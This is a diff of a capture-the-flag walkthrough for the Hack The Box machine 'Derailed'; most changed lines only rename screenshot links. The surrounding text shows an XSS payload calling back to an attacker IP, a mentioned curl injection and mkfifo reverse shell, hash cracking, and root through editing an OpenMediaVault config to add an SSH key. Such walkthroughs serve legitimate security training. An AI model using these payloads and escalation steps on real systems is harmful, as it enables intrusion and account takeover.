@@ -10,57 +10,57 @@ description: >-
 
 As usual, we start with an Nmap scan:
 
-![](<../../../.gitbook/assets/image%20(3640).png>)
+![](../../../.gitbook/assets/derailed-18.png)
 
 Port 3000 was found to be a HTTP port leading us to this Clipnotes page.
 
 ### Directory Enum
 
-![](<../../../.gitbook/assets/image%20(3904).png>)
+![](../../../.gitbook/assets/derailed-23.png)
 
 Wasn't much to play around with, as we had no credentials yet. Decided to run a directory scan to find if there are any endpoints. Eventually, I found this /rails endpoint, using dirsearch.
 
-![](<../../../.gitbook/assets/image%20(665).png>)
+![](../../../.gitbook/assets/derailed-30.png)
 
-![](<../../../.gitbook/assets/image%20(2280).png>)
+![](../../../.gitbook/assets/derailed-10.png)
 
 Interesting. This presented a lot of information for me and also tells me this is a Ruby on Rails project. Another interesting directory was the **/administration** panel which I could not view at all. This is the information from the info endpoint:
 
-![](<../../../.gitbook/assets/image%20(2666).png>)
+![](../../../.gitbook/assets/derailed-11.png)
 
 From here, we can try to fuzz out other information and endpoints on this /rail directory. I used feroxbuster for its recursive search function.
 
-![](<../../../.gitbook/assets/image%20(691).png>)
+![](../../../.gitbook/assets/derailed-31.png)
 
 This directory basically shows us every single path there was in the website:
 
-![](<../../../.gitbook/assets/image%20(517).png>)
+![](../../../.gitbook/assets/derailed-28.png)
 
 ### /clipnotes
 
 Earlier, we saw some form of clipnote function. Testing it shows us that each time we create a new one, it is stored on the server somewhere. Notice that this one I created was 110.
 
-![](<../../../.gitbook/assets/image%20(917).png>)
+![](../../../.gitbook/assets/derailed-35.png)
 
 Using the **/clipnotes/raw/:id** format, I was able to view the first clipnote, submitted by a user called Alice. Visiting anything other than 1 was not possible.
 
-![](<../../../.gitbook/assets/image%20(2852).png>)
+![](../../../.gitbook/assets/derailed-13.png)
 
 I was interested in what other number is present, so I used wfuzz to enumerate out all other numbers. None are present it seems
 
-![](<../../../.gitbook/assets/image%20(1559).png>)
+![](../../../.gitbook/assets/derailed-5.png)
 
 I checked out the other endpoints, as there may be more interesting ones. The **/report** one looks good.
 
 ### /report
 
-![](<../../../.gitbook/assets/image%20(3643).png>)
+![](../../../.gitbook/assets/derailed-19.png)
 
 Submitting a report reveals tells us that an admin would look at it. This tells me that perhaps, there is a form of XSS present on the site.
 
 When looking at the POST request for the report, we can see that it sends this authenticity\_token:
 
-![](<../../../.gitbook/assets/image%20(4060).png>)
+![](../../../.gitbook/assets/derailed-25.png)
 
 However, the cookies have been set to HttpOnly, meaning that stealing cookies is pointless in this case. XSS on the administrator could either allow us to enumerate more about the /administration page, or simply to steal his cookie and impersonate him.
 
@@ -72,11 +72,11 @@ I messed around a lot with the clipnotes and tried all sorts of stuff, but it wa
 
 So I started a HTTP server, and attempted this:
 
-![](<../../../.gitbook/assets/image%20(3753).png>)
+![](../../../.gitbook/assets/derailed-21.png)
 
 The reason I did this was because I am aware that there is a potential limit to the username, and trying to overflow that may cause the end bit to be rendered as JS code. Then I created a clipnote:
 
-![](<../../../.gitbook/assets/image%20(423).png>)
+![](../../../.gitbook/assets/derailed-26.png)
 
 The overflow kind of worked, managed to remove the last portion about the created bit. I then went to try various different payloads including \<img> tags and stuff. DIdn't really work. I then suspected this has to do with some kind of CVE that was released recently (usual pattern of HTB, uses CVEs from 2022), and went hunting for Ruby + XSS related exploits that came out recently.
 
@@ -90,11 +90,11 @@ Seems that the \<select> tag was being used maliciously. I then tried the same o
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.29/xss.pls'>
 ```
 
-![](<../../../.gitbook/assets/image%20(1107).png>)
+![](../../../.gitbook/assets/derailed-2.png)
 
 This worked! I was able to get a callback as well:
 
-![](<../../../.gitbook/assets/image%20(3056).png>)
+![](../../../.gitbook/assets/derailed-16.png)
 
 Now, we just need to find a way to exploit this XSS.
 
@@ -128,7 +128,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://
 
 This payload worked! I was able to retrieve two callbacks after creating the clipnote.
 
-![](<../../../.gitbook/assets/image%20(3918).png>)
+![](../../../.gitbook/assets/derailed-24.png)
 
 Now we can use a script from Hacktricks to steal the page content of the administration panel.
 
@@ -351,11 +351,11 @@ setTimeout(function() {
 
 When waiting around, I eventually got a callback via the `curl` command I injected.
 
-![](<../../../.gitbook/assets/image%20(489).png>)
+![](../../../.gitbook/assets/derailed-27.png)
 
 With this, we can easily gain a reverse shell through this method. I used the `mkfifo` shell, and it worked!
 
-![](<../../../.gitbook/assets/image%20(3816).png>)
+![](../../../.gitbook/assets/derailed-22.png)
 
 We can grab the user flag while we're here.
 
@@ -367,15 +367,15 @@ To establish persistence, we can put our public key within the `~/.ssh/authorize
 
 When checking the available stuff, I found this `openmediavault` folder as well.
 
-![](<../../../.gitbook/assets/image%20(788).png>)
+![](../../../.gitbook/assets/derailed-33.png)
 
 Within the `rails-app` directory, there was a `.git` repository.
 
-![](<../../../.gitbook/assets/image%20(1251).png>)
+![](../../../.gitbook/assets/derailed-4.png)
 
 I checked the logs for this using an SSH shell instead, and found credentials for an `alice` user.
 
-![](<../../../.gitbook/assets/image%20(587).png>)
+![](../../../.gitbook/assets/derailed-29.png)
 
 This password was rather useless.
 
@@ -383,37 +383,37 @@ This password was rather useless.
 
 WIthin the config file, we can find another password.
 
-![](<../../../.gitbook/assets/image%20(3741).png>)
+![](../../../.gitbook/assets/derailed-20.png)
 
 There was a sqlite3 file here. Within it, we can find this portion here with hashes for toby.
 
-![](<../../../.gitbook/assets/image%20(1040).png>)
+![](../../../.gitbook/assets/derailed-1.png)
 
 Checking the `/etc/passwd` file, we can see that the openmediavault-webgui user is Toby Wright.
 
-![](<../../../.gitbook/assets/image%20(2198).png>)
+![](../../../.gitbook/assets/derailed-9.png)
 
 I extracted this hash and attempted to crack it.
 
-![](<../../../.gitbook/assets/image%20(1672).png>)
+![](../../../.gitbook/assets/derailed-6.png)
 
 WIth this, we can `su` to the openmediavault-webgui user.
 
-![](<../../../.gitbook/assets/image%20(993).png>)
+![](../../../.gitbook/assets/derailed-36.png)
 
 ### OpenMediaVault
 
 I saw earlier there was some `omv` instance running on the machine. Running a `netstat -tulpn` confirms this to be running on port 80.
 
-![](<../../../.gitbook/assets/image%20(909).png>)
+![](../../../.gitbook/assets/derailed-34.png)
 
 Also, I saw this config file when re-running LinPEAS.
 
-![](<../../../.gitbook/assets/image%20(2974).png>)
+![](../../../.gitbook/assets/derailed-15.png)
 
 Open Media Vault is a network-attahced storage system, and I wanted to take a look into it. We can port forward this via `chisel`.
 
-![](<../../../.gitbook/assets/image%20(1975).png>)
+![](../../../.gitbook/assets/derailed-8.png)
 
 I couldn't find the creds for this to login, so I was unable to exploit it.
 
@@ -421,15 +421,15 @@ I couldn't find the creds for this to login, so I was unable to exploit it.
 
 I took a look at the config files that we had access to. There was one portion that was interesting.
 
-![](<../../../.gitbook/assets/image%20(3638).png>)
+![](../../../.gitbook/assets/derailed-17.png)
 
 There were user entries, and they seemed to accept a `name` and an `sshpubkeys`. Perhaps this could be used to update the SSH for the machine or something. Checking our `id`, it seems we can edit this config file and update it as well.
 
-![](<../../../.gitbook/assets/image%20(1149).png>)
+![](../../../.gitbook/assets/derailed-3.png)
 
 The `/usr/sbin` file contains loads of `omv` related tools too:
 
-![](<../../../.gitbook/assets/image%20(2824).png>)
+![](../../../.gitbook/assets/derailed-12.png)
 
 This website on the OMV website was very helpful:
 
@@ -439,16 +439,16 @@ The vulnerability here is that the `config.xml` file is owned by our current use
 
 There are 2 entries within the machine, one for `rails` and one for `test`. We can edit the `test` one for the root user, and use `ssh-keygen -t rsa; ssh-keygen -e -f ~/.ssh/id_rsa.pub` to generate the needed key in the right format.
 
-![](<../../../.gitbook/assets/image%20(2929).png>)
+![](../../../.gitbook/assets/derailed-14.png)
 
 Note that we need to add the `<sshpubkey>` tag because we are specifying a new object. Then, we need to reset the OMV instance to read the new config file. From the OMV documentation, we can use the `omv-confdbadm` file to do so.
 
 {% embed url="https://docs.openmediavault.org/en/6.x/development/tools/omv_confdbadm.html" %}
 
-![](<../../../.gitbook/assets/image%20(1882).png>)
+![](../../../.gitbook/assets/derailed-7.png)
 
 Then, we need to make changes to edit the SSH module for the OMV instance. This can be done using `omv-rpc` to force a config update for the SSH module.
 
-![](<../../../.gitbook/assets/image%20(744).png>)
+![](../../../.gitbook/assets/derailed-32.png)
 
 Interesting root for this machine. OMV is something that I don't see around often.
